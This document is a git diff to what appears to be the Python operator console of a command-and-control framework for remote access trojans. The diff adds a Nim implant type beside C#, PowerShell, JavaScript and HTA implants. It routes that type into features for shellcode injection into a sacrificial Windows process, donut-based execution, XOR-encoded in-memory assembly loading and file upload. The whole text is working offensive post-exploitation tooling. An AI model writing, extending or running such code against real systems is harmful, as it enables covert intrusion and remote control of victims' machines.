@@ -58,7 +58,7 @@ msbuild_path = default_msbuild_path
 default_shellcode_process = "C:\\Windows\\System32\\SearchProtocolHost.exe" # Default sacrificial process for creating a new process then injecting shellcode
 shellcode_process = default_shellcode_process
 
-supported_types = ["c", "c#", "js", "ps1", "hta"]
+supported_types = ["nim", "c#", "js", "ps1", "hta"]
 alpha = string.ascii_lowercase # Grab the alphabet in lowercase format 
 
 # Generate a random path to serve payloads off of
@@ -259,12 +259,12 @@ def colors(value):
     BOLD = '\001\033[1m\002'
     ENDC = '\001\033[0m\002'
     UNDERLINE = '\001\033[4m\002'
-    c = '\001\033[91m\002'    # Red
+    nim = '\001\033[91m\002'  # Red
     cs = '\001\033[92m\002'   # Green
     js = '\001\033[93m\002'   # Yellow
     ps1 = '\001\033[94m\002'  # Blue
     hta = '\001\033[95m\002'  # Purple
-    colors = {"c":c, "c#":cs, "js":js, "ps1":ps1, "hta":hta}
+    colors = {"nim":nim, "c#":cs, "js":js, "ps1":ps1, "hta":hta}
     if(value in colors.keys()):
         return(colors[value] + value + ENDC)
     elif(value in types.keys()):
@@ -274,9 +274,9 @@ def colors(value):
     elif(value == "<direct>"):
         return("<direct>")
     elif(value == ">>"):
-        return( BOLD + c + ">" + js + ">" + ENDC)
+        return( BOLD + nim + ">" + js + ">" + ENDC)
     elif(value == "quit"):
-        return(c + "commit Seppuku" + ENDC)
+        return(nim + "commit Seppuku" + ENDC)
     elif(value == "HTTP"):
         return(BOLD + js + value + ENDC)
     elif(value == "HTTPS"):
@@ -285,7 +285,7 @@ def colors(value):
         checkin = datetime.strptime(value, "%H:%M:%S")
         delta_seconds = (datetime.now() - checkin).seconds
         if(delta_seconds > 21):
-            return(BOLD + c + value + ENDC)
+            return(BOLD + nim + value + ENDC)
         elif(delta_seconds > 7):
             return(BOLD + js + value + ENDC)
         else:
@@ -993,7 +993,7 @@ if __name__ == "__main__":
                                     extra_cmds = " ".join(inp.split(" ")[2:])
                                 except:
                                     pass
-                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
+                                if(types[ratID] == "ps1" or types[ratID] == "c#" or types[ratID] == "nim"):
                                     inp = "psh " + create_psscript(filepath, extra_cmds)
                                 else:
                                     inp = "psh " + msbuild_path + " " + send_nps_msbuild_xml(inp, ratID)
@@ -1006,7 +1006,7 @@ if __name__ == "__main__":
                                 arg1 = inp.split(" ")[1]
                                 if(types[ratID] == "ps1"):
                                     inp = "shc " +  send_invoke_shellcode(inp, ratID)
-                                elif(types[ratID] == "c#"):
+                                elif(types[ratID] == "c#" or types[ratID] == "nim"):
                                     if(arg1 == "local" or arg1.isdigit()):
                                         inp = "shc " + encode_file(inp.split(" ")[2]) + " " + arg1
                                     else:
@@ -1022,7 +1022,7 @@ if __name__ == "__main__":
                             if(types[ratID] == "ps1"):
                                 pretty_print("[!] Feature is unsupported for PS1 rats, sorry")
                                 continue
-                            elif(types[ratID] == "c#"):
+                            elif(types[ratID] == "c#" or types[ratID] == "nim"):
                                 inp = "shc " + cs_donut_exec(inp)
                             else:
                                 inp = "shc " + msbuild_path + " " + donut_exec(inp, ratID)
@@ -1030,7 +1030,7 @@ if __name__ == "__main__":
                         elif(str.startswith(inp, "eval ")):
                             try:
                                 filepath = inp.split(" ")[1]
-                                if(types[ratID] == "ps1" or types[ratID] == "c#"):
+                                if(types[ratID] == "ps1" or types[ratID] == "c#" or types[ratID] == "nim"):
                                     pretty_print("[!] Eval is not supported for PS1 or C# rats")
                                     continue
                                 else:
@@ -1055,7 +1055,7 @@ if __name__ == "__main__":
                                 filepath = inp.split(" ")[1]
                                 if(types[ratID] == "ps1"):
                                     inp = "cs " + send_invoke_assembly(inp)
-                                elif(types[ratID] == "c#"):
+                                elif(types[ratID] == "c#" or types[ratID] == "nim"):
                                     with open(filepath, "rb") as fd:
                                         inp = "cs " + xor_crypt_and_encode(fd.read(), ratID) + " " + parse_c_sharp_args(inp)
                                 else:
@@ -1068,7 +1068,6 @@ if __name__ == "__main__":
                             try:
                                 localpath = inp.split(" ")[1]
                                 remotepath = inp.split(" ")[2] #BAD -- does not account for remote paths that contain space: "C:\Program Files\whatever.txt"
-                                # remotepath = remotepath.replace("\\", "\\\\") # Might not actually need to replace with double backslashes. Removed to allow \\UNC\paths
                                 inp = "up " + encode_file(localpath) + " " + remotepath
                             except:
                                 pretty_print("[!] Could not open file " + colors(localpath) + " for reading or no remote path specified")
